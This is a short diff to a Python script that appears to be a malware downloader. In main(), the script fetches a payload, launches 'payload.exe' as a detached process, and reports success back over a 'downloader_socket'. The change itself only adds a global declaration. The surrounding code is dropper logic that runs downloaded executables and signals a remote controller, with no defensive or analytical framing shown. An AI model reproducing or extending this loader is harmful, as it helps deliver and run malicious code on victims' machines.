@@ -22,6 +22,7 @@ def exec_payload(name):
     subprocess.Popen(name,creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
 
 def main():
+    global downloader_socket
     if(get_payload()):
         exec_payload("payload.exe")
         downloader_socket.send("1".encode())
